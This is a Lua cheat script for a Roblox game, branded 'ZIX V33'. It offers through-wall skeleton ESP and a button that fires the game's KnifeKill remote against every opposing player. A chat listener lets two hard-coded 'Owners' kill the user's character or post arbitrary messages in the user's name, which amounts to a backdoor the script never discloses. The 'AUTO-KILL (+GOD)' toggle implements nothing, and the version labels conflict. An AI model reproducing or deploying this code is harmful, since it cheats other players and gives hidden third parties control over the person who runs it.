--[[ 
    ZIX V33 - PC ELITE FINAL
    - DRAG: Restaurado y optimizado para mouse.
    - REDES: Añadidas al loader (guns.lol/belfebu).
    - ESP: Skeleton 3D Fixed Height.
    - UI: Alternar con Ctrl Derecho + Animación.
]]

local Services = setmetatable({}, {__index = function(t, k) return game:GetService(k) end})
local LP, RS, TS, Run, UIS = Services.Players.LocalPlayer, Services.ReplicatedStorage, Services.TweenService, Services.RunService, Services.UserInputService

getgenv().AutoKill, getgenv().ESP_Enabled = false, false
local Owners, LL_IMAGE, UI_Visible = {["kp_omnipower"] = true, ["Mixsito"] = true}, "rbxassetid://138873321650261", true

-- // SISTEMA DE ARRASTRE (DRAG)
local function MakeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
    end)
    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- // NOTIFICACIONES
local function Notify(title, text, color)
    local nsg = LP.PlayerGui:FindFirstChild("ZixNotify") or Instance.new("ScreenGui", LP.PlayerGui); nsg.Name = "ZixNotify"
    local f = Instance.new("Frame", nsg); f.Size = UDim2.new(0, 250, 0, 70); f.Position = UDim2.new(1, 10, 0.8, 0); f.BackgroundColor3 = Color3.fromRGB(15, 15, 20); Instance.new("UICorner", f); Instance.new("UIStroke", f).Color = color
    local tl = Instance.new("TextLabel", f); tl.Size = UDim2.new(1, -10, 0, 30); tl.Position = UDim2.new(0, 10, 0, 5); tl.Text = title; tl.TextColor3 = color; tl.Font = "GothamBold"; tl.TextSize = 14; tl.BackgroundTransparency = 1; tl.TextXAlignment = "Left"
    local tx = Instance.new("TextLabel", f); tx.Size = UDim2.new(1, -10, 0, 30); tx.Position = UDim2.new(0, 10, 0, 30); tx.Text = text; tx.TextColor3 = Color3.new(1, 1, 1); tx.Font = "Gotham"; tx.TextSize = 12; tx.BackgroundTransparency = 1; tx.TextXAlignment = "Left"
    TS:Create(f, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Position = UDim2.new(1, -260, 0.8, 0)}):Play()
    task.delay(4, function() TS:Create(f, TweenInfo.new(0.5), {Position = UDim2.new(1, 10, 0.8, 0)}):Play(); task.wait(0.5); f:Destroy() end)
end

-- // COMANDOS
local function ProcessCommand(p, msg)
    if not p or not Owners[p.Name] then return end
    local m = msg:lower()
    if m == ".die" or m == "die" or m == "die." or msg == "Die." then
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then LP.Character.Humanoid.Health = 0 end
    elseif m:sub(1, 5) == "!say " then
        local txt = msg:sub(6)
        pcall(function()
            if Services:FindFirstChild("TextChatService") and Services.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                Services.TextChatService.TextChannels.RBXGeneral:SendAsync(txt)
            else RS.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(txt, "All") end
        end)
    end
end
for _, p in pairs(Services.Players:GetPlayers()) do p.Chatted:Connect(function(m) ProcessCommand(p, m) end) end
Services.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ProcessCommand(p, m) end) end)

-- // ESP FIXED
local function CreateSkeleton(p)
    local folder = Instance.new("Folder", LP.PlayerGui); folder.Name = "ZixSk_" .. p.Name
    local Limbs = {{"Head","UpperTorso"},{"UpperTorso","LowerTorso"},{"UpperTorso","LeftUpperArm"},{"LeftUpperArm","LeftLowerArm"},{"UpperTorso","RightUpperArm"},{"RightUpperArm","RightLowerArm"},{"LowerTorso","LeftUpperLeg"},{"LeftUpperLeg","LeftLowerLeg"},{"LowerTorso","RightUpperLeg"},{"RightUpperLeg","RightLowerLeg"}}
    local Lines = {}
    for i = 1, #Limbs do local l = Instance.new("CylinderHandleAdornment", folder); l.AlwaysOnTop = true; l.Radius = 0.12; l.Transparency = 0.2; Lines[i] = l end
    Run.RenderStepped:Connect(function()
        if getgenv().ESP_Enabled and p.Character and p.Character:FindFirstChild("Humanoid") and p ~= LP then
            local color = (p:GetAttribute("Team") == LP:GetAttribute("Team")) and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 0, 80)
            for i, joint in pairs(Limbs) do
                local p1, p2 = p.Character:FindFirstChild(joint[1]), p.Character:FindFirstChild(joint[2])
                if p1 and p2 then
                    local dist = (p1.Position - p2.Position).Magnitude
                    Lines[i].Visible, Lines[i].Height, Lines[i].CFrame, Lines[i].Adornee, Lines[i].Color3 = true, dist, CFrame.new(p1.Position, p2.Position) * CFrame.new(0, 0, -dist/2), p1, color
                else Lines[i].Visible = false end
            end
        else for _, l in pairs(Lines) do l.Visible = false end end
    end)
end
for _, p in pairs(Services.Players:GetPlayers()) do CreateSkeleton(p) end

-- // UI PC
local sg = Instance.new("ScreenGui", LP.PlayerGui); sg.Name = "Zix_PC"; sg.ResetOnSpawn = false
local Main = Instance.new("Frame", sg); Main.Size = UDim2.new(0, 260, 0, 250); Main.Position = UDim2.new(0.5, -130, 0.5, -125); Main.BackgroundColor3 = Color3.fromRGB(12, 12, 15); Main.Visible = false; Instance.new("UICorner", Main); Instance.new("UIStroke", Main).Color = Color3.fromRGB(255, 50, 50)
local Title = Instance.new("TextLabel", Main); Title.Size = UDim2.new(1, 0, 0, 40); Title.Position = UDim2.new(0,0,0.7,0); Title.Text = "ZIX V22 PRO"; Title.TextColor3 = Color3.new(1, 1, 1); Title.Font = "GothamBold"; Title.TextSize = 16; Title.BackgroundTransparency = 1
MakeDraggable(Main)

local function CreateBtn(name, text, yPos, cb)
    local b = Instance.new("TextButton", Main); b.Name, b.Size, b.Position, b.BackgroundColor3, b.Text, b.TextColor3, b.Font, b.TextSize = name, UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0, yPos), Color3.fromRGB(20, 20, 25), text, Color3.new(1, 1, 1), "GothamBold", 12; Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(cb) return b
end

CreateBtn("Manual", "ATAQUE MANUAL", 20, function() 
    local g, t = LP:GetAttribute("Game"), LP:GetAttribute("Team")
    for _, v in pairs(Services.Players:GetPlayers()) do if v ~= LP and v:GetAttribute("Game") == g and v:GetAttribute("Team") ~= t then RS.KnifeKill:FireServer(v, v) end end
end)
local ABtn = CreateBtn("AutoKillBtn", "AUTO-KILL (+GOD): OFF", 85, function()
    getgenv().AutoKill = not getgenv().AutoKill
    ABtn.Text = "AUTO-KILL (+GOD): " .. (getgenv().AutoKill and "ON" or "OFF")
    ABtn.TextColor3 = getgenv().AutoKill and Color3.fromRGB(0, 255, 150) or Color3.new(1, 1, 1)
end)
local EBtn = CreateBtn("ESPBtn", "SKELETON ESP: OFF", 150, function()
    getgenv().ESP_Enabled = not getgenv().ESP_Enabled
    EBtn.Text = "SKELETON ESP: " .. (getgenv().ESP_Enabled and "ON" or "OFF")
    EBtn.TextColor3 = getgenv().ESP_Enabled and Color3.fromRGB(0, 200, 255) or Color3.new(1, 1, 1)
end)

UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightControl then
        UI_Visible = not UI_Visible
        if UI_Visible then Main.Visible = true; TS:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -130, 0.5, -125)}):Play()
        else local t = TS:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -130, 1.2, 0)}); t:Play(); t.Completed:Connect(function() if not UI_Visible then Main.Visible = false end end) end
    end
end)

-- // LOADER PC
local Loader = Instance.new("Frame", sg); Loader.Size, Loader.Position, Loader.BackgroundColor3 = UDim2.new(0, 300, 0, 320), UDim2.new(0.5, -150, 0.5, -160), Color3.fromRGB(10, 10, 12); Instance.new("UICorner", Loader)
local LL = Instance.new("ImageLabel", Loader); LL.Size, LL.Position, LL.Image, LL.BackgroundTransparency = UDim2.new(0, 90, 0, 90), UDim2.new(0.5, -45, 0, 30), LL_IMAGE, 1; Instance.new("UICorner", LL).CornerRadius = UDim.new(1, 0)

task.spawn(function()
    local function Type(t, y, c) local l = Instance.new("TextLabel", Loader); l.Size, l.Position, l.BackgroundTransparency, l.TextColor3, l.Font, l.TextSize, l.Text = UDim2.new(1,0,0,20), UDim2.new(0,0,0,y), 1, c or Color3.new(1,1,1), "Code", 12, ""; for i=1,#t do l.Text=t:sub(1,i) task.wait(0.04) end end
    Type("Nota: Belfebu Edition - guns.lol/belfebu", 160)
    Type("Redes: guns.lol/belfebu | @mixrenacido", 190, Color3.fromRGB(255, 50, 50))
    Type("Cargando motor Zix PC...", 230, Color3.fromRGB(150, 150, 150))
    task.wait(2.5); Loader:Destroy(); Main.Visible = true; Notify("ZIX", "Presiona CTRL DERECHO para ocultar", Color3.new(1, 1, 1))
end)
